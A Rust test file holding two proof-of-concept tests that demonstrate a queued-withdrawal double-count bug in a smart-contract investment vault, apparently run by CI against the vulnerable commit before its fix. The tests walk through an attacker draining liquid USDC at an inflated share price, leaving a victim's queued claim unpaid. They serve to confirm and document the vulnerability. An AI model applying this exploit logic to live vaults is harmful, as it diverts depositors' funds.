// ═══════════════════════════════════════════════════════════════════════════
// HELIOBOND ZOMBIE-HUNT PoC — queued-withdrawal double count (#613 / #640)
//
// Appended by the CI job to investment_vault/src/test.rs of the VULNERABLE
// commit (c79daec, the parent of fix e99b4cc). Deterministic, no randomness.
//
// Scenario (all amounts in 7-decimal USDC units):
//   victim deposits   40,000 USDC  -> 398,000,000,000 shares
//   attacker deposits 10,000 USDC  ->  99,002,500,000 shares
//   admin deploys 15,000 USDC into a project (30% utilisation, below the 50%
//   tier at which withdrawals are throttled) -> liquid 35,000, investments 15,000
//   victim withdraws everything: claim 400,400,400,400 > liquid 350,000,000,000
//     -> shares burned, QueuedClaim recorded, but total_assets() is NOT reduced
//   attacker redeems the largest immediately-payable slice at the inflated
//     price and drains the liquid the queue is owed.
// ═══════════════════════════════════════════════════════════════════════════
#[test]
fn poc_vulnerable_queued_claim_double_count() {
    let s = setup();
    let victim = Address::generate(&s.env);
    let attacker = Address::generate(&s.env);

    let victim_deposit: i128 = 40_000_0000000;
    let attacker_deposit: i128 = 10_000_0000000;
    mint_usdc(&s.env, &s.usdc_sac, &victim, victim_deposit);
    mint_usdc(&s.env, &s.usdc_sac, &attacker, attacker_deposit);
    let victim_shares = s.vault_client.deposit(&victim, &victim_deposit);
    let attacker_shares = s.vault_client.deposit(&attacker, &attacker_deposit);

    // Admin deploys 15,000 USDC into a whitelisted project.
    let registry_client = registry_contract::Client::new(&s.env, &s.registry);
    let creator = Address::generate(&s.env);
    registry_client.set_whitelist(&creator, &true);
    let project_id = registry_client.create_project(
        &creator,
        &String::from_str(&s.env, "ipfs://poc-double-count"),
        &0u64,
        &test_metadata_hash(&s.env),
    );
    s.vault_client.fund_project(&project_id, &15_000_0000000);

    // Expire the 24h deposit lock.
    s.env.ledger().with_mut(|li| {
        li.timestamp += MIN_LOCK_PERIOD + 1;
    });

    let usdc = TokenClient::new(&s.env, &s.usdc_sac);
    let ta_before = s.vault_client.total_assets();
    let liquid_before = usdc.balance(&s.vault_address);
    let victim_claim = s.vault_client.convert_to_assets(&victim_shares);
    assert!(
        victim_claim > liquid_before,
        "precondition failed: victim claim {} must exceed liquid {}",
        victim_claim,
        liquid_before
    );

    // 1. Victim withdraws everything -> shares burned, claim queued.
    let paid_victim = s.vault_client.withdraw(&victim, &victim_shares, &0);
    assert_eq!(paid_victim, 0, "victim withdrawal must be queued");
    assert_eq!(s.vault_client.balance(&victim), 0, "victim shares burned");

    let ta_after_queue = s.vault_client.total_assets();
    let liquid_after_queue = usdc.balance(&s.vault_address);
    let supply_after = s.vault_client.total_supply();

    // THE BUG: the queued USDC is still inside total_assets().
    assert_eq!(
        ta_after_queue, ta_before,
        "BUG CONFIRMED: total_assets did not fall by the queued claim"
    );
    assert!(
        ta_after_queue > liquid_after_queue,
        "BUG CONFIRMED: NAV still counts assets committed to the queue"
    );

    // 2. Attacker drains every immediately-payable USDC at the inflated price.
    let mut shares_to_burn: i128 = if ta_after_queue > 0 {
        liquid_after_queue * supply_after / ta_after_queue
    } else {
        0
    };
    if shares_to_burn > attacker_shares {
        shares_to_burn = attacker_shares;
    }
    while shares_to_burn > 0
        && s.vault_client.convert_to_assets(&shares_to_burn) > liquid_after_queue
    {
        shares_to_burn -= 1;
    }
    assert!(shares_to_burn > 0, "attacker must be able to redeem");

    let attacker_cash_before = usdc.balance(&attacker);
    let paid_attacker = s.vault_client.withdraw(&attacker, &shares_to_burn, &0);
    let attacker_cash = usdc.balance(&attacker);
    assert_eq!(
        attacker_cash - attacker_cash_before,
        paid_attacker,
        "attacker received the payout"
    );

    // Fair value of exactly those burned shares if NAV excluded the queue
    // (i.e. what the fixed code pays for the same shares).
    let fair_ta = ta_after_queue - victim_claim;
    let fair_paid = shares_to_burn * fair_ta / supply_after;
    let extraction = paid_attacker - fair_paid;

    // 3. Insolvency: remaining assets are below the queued liability.
    let ta_final = s.vault_client.total_assets();
    let liquid_final = usdc.balance(&s.vault_address);
    let victim_paid_by_claim = s.vault_client.claim();

    assert!(
        extraction > 0,
        "BUG CONFIRMED: attacker was overpaid by {} units out of the queue",
        extraction
    );
    assert!(
        ta_final < victim_claim,
        "BUG CONFIRMED: total_assets {} < queued liabilities {}",
        ta_final,
        victim_claim
    );
    assert_eq!(
        victim_paid_by_claim, 0,
        "queue cannot be paid: the attacker drained the liquid it was owed"
    );
    let victim_shortfall = victim_claim - ta_final;

    println!(
        "POC_JSON {{\"test\":\"poc_vulnerable_queued_claim_double_count\",\
\"victim_deposit\":{},\"attacker_deposit\":{},\
\"ta_before\":{},\"liquid_before\":{},\"victim_shares\":{},\"attacker_shares\":{},\
\"victim_claim\":{},\"ta_after_queue\":{},\"liquid_after_queue\":{},\"supply_after\":{},\
\"attacker_shares_burned\":{},\"paid_attacker\":{},\"fair_paid\":{},\"extraction\":{},\
\"ta_final\":{},\"liquid_final\":{},\"victim_paid_by_claim\":{},\"victim_shortfall\":{},\
\"attacker_net_profit\":{}}}",
        victim_deposit,
        attacker_deposit,
        ta_before,
        liquid_before,
        victim_shares,
        attacker_shares,
        victim_claim,
        ta_after_queue,
        liquid_after_queue,
        supply_after,
        shares_to_burn,
        paid_attacker,
        fair_paid,
        extraction,
        ta_final,
        liquid_final,
        victim_paid_by_claim,
        victim_shortfall,
        attacker_cash - attacker_cash_before - attacker_deposit
    );
}

// ───────────────────────────────────────────────────────────────────────────
// Variant 2: minimal attacker stake, near-total diversion of the queue.
//   victim deposits 40,000; attacker deposits only 200 (above MIN_WITHDRAW);
//   admin deploys 1,000 (2.5% utilisation) so the victim's 40,001 claim queues;
//   the attacker then drains every immediately-payable USDC (39,200) at the
//   inflated price. Fair value of the burned shares is ~194, so ~39,006 is
//   diverted from the queue — ~97.5% of the victim's claim.
// ───────────────────────────────────────────────────────────────────────────
#[test]
fn poc_vulnerable_max_extraction_small_stake() {
    let s = setup();
    let victim = Address::generate(&s.env);
    let attacker = Address::generate(&s.env);

    let victim_deposit: i128 = 40_000_0000000;
    let attacker_deposit: i128 = 200_0000000;
    mint_usdc(&s.env, &s.usdc_sac, &victim, victim_deposit);
    mint_usdc(&s.env, &s.usdc_sac, &attacker, attacker_deposit);
    let victim_shares = s.vault_client.deposit(&victim, &victim_deposit);
    let attacker_shares = s.vault_client.deposit(&attacker, &attacker_deposit);

    let registry_client = registry_contract::Client::new(&s.env, &s.registry);
    let creator = Address::generate(&s.env);
    registry_client.set_whitelist(&creator, &true);
    let project_id = registry_client.create_project(
        &creator,
        &String::from_str(&s.env, "ipfs://poc-max-extraction"),
        &0u64,
        &test_metadata_hash(&s.env),
    );
    s.vault_client.fund_project(&project_id, &1_000_0000000);

    s.env.ledger().with_mut(|li| {
        li.timestamp += MIN_LOCK_PERIOD + 1;
    });

    let usdc = TokenClient::new(&s.env, &s.usdc_sac);
    let liquid_before = usdc.balance(&s.vault_address);
    let victim_claim = s.vault_client.convert_to_assets(&victim_shares);
    assert!(victim_claim > liquid_before, "precondition: victim queues");

    assert_eq!(s.vault_client.withdraw(&victim, &victim_shares, &0), 0);
    let ta_after_queue = s.vault_client.total_assets();
    let supply_after = s.vault_client.total_supply();
    let liquid_after_queue = usdc.balance(&s.vault_address);

    let mut shares_to_burn: i128 = liquid_after_queue * supply_after / ta_after_queue;
    if shares_to_burn > attacker_shares {
        shares_to_burn = attacker_shares;
    }
    while shares_to_burn > 0
        && s.vault_client.convert_to_assets(&shares_to_burn) > liquid_after_queue
    {
        shares_to_burn -= 1;
    }

    let cash_before = usdc.balance(&attacker);
    let paid = s.vault_client.withdraw(&attacker, &shares_to_burn, &0);
    let cash_after = usdc.balance(&attacker);
    let fair_ta = ta_after_queue - victim_claim;
    let fair_paid = shares_to_burn * fair_ta / supply_after;
    let extraction = paid - fair_paid;
    let ta_final = s.vault_client.total_assets();

    // The attacker takes essentially the whole queue: >90% of the victim's claim.
    assert!(
        extraction > victim_claim * 9 / 10,
        "expected near-total diversion: extraction {} vs claim {}",
        extraction,
        victim_claim
    );
    assert!(ta_final < victim_claim, "insolvent");
    assert_eq!(s.vault_client.claim(), 0, "queue unpaid");

    println!(
        "POC_JSON {{\"test\":\"poc_vulnerable_max_extraction_small_stake\",\
\"victim_deposit\":{},\"attacker_deposit\":{},\
\"victim_shares\":{},\"attacker_shares\":{},\"victim_claim\":{},\
\"ta_after_queue\":{},\"liquid_after_queue\":{},\"supply_after\":{},\
\"attacker_shares_burned\":{},\"paid_attacker\":{},\"fair_paid\":{},\"extraction\":{},\
\"ta_final\":{},\"attacker_net_profit\":{}}}",
        victim_deposit,
        attacker_deposit,
        victim_shares,
        attacker_shares,
        victim_claim,
        ta_after_queue,
        liquid_after_queue,
        supply_after,
        shares_to_burn,
        paid,
        fair_paid,
        extraction,
        ta_final,
        cash_after - cash_before - attacker_deposit
    );
}
